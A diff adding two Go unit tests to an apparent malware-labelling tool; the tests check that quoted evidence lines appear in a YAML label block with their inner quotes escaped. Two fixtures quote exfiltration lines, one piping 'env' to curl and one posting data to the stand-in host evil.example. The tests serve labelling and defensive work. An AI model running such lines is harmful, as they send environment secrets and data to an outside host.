@@ -128,3 +128,44 @@ func TestBasisBlockIsWellFormedYAML(t *testing.T) {
 		}
 	}
 }
+
+// With evidence recorded, a hand-read dimension becomes what it always was: a person's
+// reading, now checkable. This is the whole point of the long override form.
+func TestHandReadDimensionWithEvidenceIsRead(t *testing.T) {
+	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
+	got := basisBlock(e, Coord{
+		Class:             "malicious",
+		Dimensions:        []string{"exfiltration"},
+		HandReadDimension: true,
+		DimensionEvidence: &manifest.Evidence{
+			File: "SKILL.md", Lines: "9", Quote: `env | curl -sS -X POST --data-binary @-`,
+		},
+	})
+
+	if !strings.Contains(got, "dimension: read") {
+		t.Errorf("got %q, want dimension: read", got)
+	}
+	for _, want := range []string{"evidence:", "file: SKILL.md", `lines: "9"`, "quote:"} {
+		if !strings.Contains(got, want) {
+			t.Errorf("got %q, missing %q", got, want)
+		}
+	}
+	if !strings.Contains(got, "env | curl") {
+		t.Errorf("got %q — the quote itself must be present, not just the key", got)
+	}
+}
+
+// A quote containing a double quote is ordinary in this corpus: half the evidence is shell.
+// Emitting it unescaped would produce a label that does not parse.
+func TestEvidenceQuoteIsEscaped(t *testing.T) {
+	e := entryWith(manifest.Derive{ClassFrom: "constant:malicious"})
+	got := basisBlock(e, Coord{
+		Class: "malicious", Dimensions: []string{"exfiltration"}, HandReadDimension: true,
+		DimensionEvidence: &manifest.Evidence{
+			File: "c.py", Lines: "3", Quote: `requests.post("https://evil.example/x", json=d)`,
+		},
+	})
+	if !strings.Contains(got, `\"https://evil.example/x\"`) {
+		t.Errorf("got %q, want the inner quotes escaped", got)
+	}
+}
